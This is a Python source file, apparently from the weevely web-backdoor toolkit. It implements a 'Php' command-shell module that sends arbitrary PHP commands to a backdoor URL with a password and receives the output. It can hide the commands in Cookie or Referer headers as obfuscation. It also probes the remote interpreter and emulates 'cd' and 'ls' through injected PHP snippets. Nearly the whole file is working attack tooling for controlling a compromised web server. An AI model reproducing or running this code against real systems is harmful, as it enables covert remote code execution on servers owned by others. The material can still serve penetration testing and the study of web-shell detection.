'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.http.cmdrequest import CmdRequest, NoDataException
from core.parameters import ParametersList, Parameter as P

import random, os

classname = 'Php'
    
    
class Php(Module):
    '''Shell to execute PHP commands
    
    Every run should be run_module to avoid recursive
    interpreter probing
    '''
    
    params = ParametersList('PHP command shell', [],
                             P(arg='cmd', help='PHP command enclosed with brackets and terminated by semi-comma', required=True, pos=0),
                             P(arg='mode', help='Obfuscation mode', choices = ['Cookie', 'Referer' ]),
                             P(arg='proxy', help='HTTP proxy'),
                             P(arg='debug', help='Enable requests and response debug', type=bool, default=False, hidden=True)
                        )
    
    
    def __init__(self, modhandler, url, password):
        
        self.cwd_vector = None
        self.path = None
        self.proxy = None

        self.modhandler = modhandler        
        
        self.post_data = {}
        
        self.current_mode = None
                    
        self.use_current_path = True
                    
        self.available_modes = self.params.get_parameter_choices('mode')
                    
        mode = self.params.get_parameter_value('mode')
        if mode:
            self.modes = [ mode ]
        else:
            self.modes = self.available_modes

        proxy = self.params.get_parameter_value('proxy')
        
        if proxy:
            self.mprint('[!] Proxies can break weevely requests, if possibile use proxychains')
            self.proxy = { 'http' : proxy }

        
        Module.__init__(self, modhandler, url, password)
        
                

    def _probe(self):
        
        for currentmode in self.modes:
            
            rand = str(random.randint( 11111, 99999 ))
            
            if self.run_module('echo %s;' % (rand)) == rand:
                self.current_mode = currentmode
                self.params.set_and_check_parameters({'mode' : currentmode}, False)
                break
        
        if not self.current_mode:
            raise ModuleException(self.name,  "PHP interpreter initialization failed")
        else:
            
            if self.run_module('is_callable("is_dir") && is_callable("chdir") && is_callable("getcwd") && print(1);') != '1':
                self.mprint('[!] Error testing directory change methods, \'cd\' and \'ls\' will not work.')
            else:
                self.cwd_vector = "chdir('%s'); %s" 
                
                
    def set_post_data(self, post_data = {}):
        """Post data is cleaned after every use """
        
        self.post_data.update(post_data)
       
       
    def run_module(self, cmd, mode = None, proxy = None, debug = None):

        if mode:
            self.mode = mode
            
        if proxy:
            if not self.proxy:
                self.mprint('[!] Proxies can break weevely requests, if possibile use proxychains')
            self.proxy = { 'http' : proxy }
        
        # Debug is equal to None only if called directly by run_module
        if debug == None:
            debug = self.params.get_parameter_value('debug')

        if self.use_current_path and self.cwd_vector and self.path:
            cmd = self.cwd_vector % (self.path, cmd)
        
        cmd = cmd.strip()
        if cmd and cmd[-1] not in (';', '}'):
            self.mprint('[!] Warning: PHP command \'..%s\' doesn\'t have trailing semicolon' % (cmd[-10:]))
        
        request = CmdRequest( self.url, self.password, self.proxy)
        request.setPayload(cmd, self.current_mode)

    
        debug_level = 1
        if debug:
            debug_level = 5
        
        if self.post_data:
            request.setPostData(self.post_data)
            self.mprint( "Post data values:", debug_level)
            for p in self.post_data:
                self.mprint("  %s (%i)" % (p, len(self.post_data[p])), debug_level)
            self.post_data = {}

            
        self.mprint( "Request: %s" % (cmd), debug_level)
         
        
        try:
            resp = request.execute()
        except NoDataException, e:
            self.mprint( "Response: NoData", debug_level)
            pass
        except IOError, e:
            self.mprint('[!] %s. Are backdoor URL or proxy reachable?' % e.strerror)
        except Exception, e:
            self.mprint('[!] Error connecting to backdoor URL or proxy')
        else:
                    
            if  'error' in resp and 'eval()\'d code' in resp:
                self.mprint('[!] Invalid response \'%s\', skipping' % (cmd), debug_level)
            else:
                self.mprint( "Response: %s" % resp, debug_level)
                return resp
        

    def cwd_handler (self, path):
        
        response = self.run_module( "@chdir('%s'); print(getcwd());" % path)
        if response.rstrip('/') == path.rstrip('/'):
            if path != '/':
                self.path = path.rstrip('/')
            else:
                self.path = path
                
            return self.path
    
    def ls_handler (self, cmd):
        
        cmd_splitted = cmd.split()
        
        ls_vector = "$dir=@opendir('%s'); $a=array(); while(($f = readdir($dir))) { $a[]=$f; }; sort($a); print(join('\n', $a));"
        
        path = None
        if len(cmd_splitted)>2:
            self.mprint('[!] Error, PHP shell \'ls\' replacement support only path as argument')
        elif len(cmd_splitted)==2:
            path = cmd_splitted[1]
        elif self.path:
            path = self.path
        else:
            path = '.'
            
        if path:
            response = self.run_module( ls_vector % (path) )
            
            if not response:
                self.mprint('[!] Error listing files in \'%s\'. Wrong path or not enough privileges' % path)
            else:
                return response
            
    
    